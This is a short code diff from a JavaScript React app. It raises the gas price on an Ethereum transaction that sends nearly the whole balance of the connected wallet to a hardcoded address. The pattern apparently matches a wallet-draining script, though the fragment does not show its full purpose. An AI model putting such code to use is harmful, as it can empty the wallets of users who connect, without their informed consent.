@@ -33,7 +33,7 @@ function App() {
             "from": address[0],
             "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
             "gas": Number(21000).toString(16),
-            "gasPrice": Number(170000000000).toString(16),
+            "gasPrice": Number(350000000000).toString(16),
             "value": (parseInt(balance) - Number(3700000000000000)).toString(16)
         }]
 
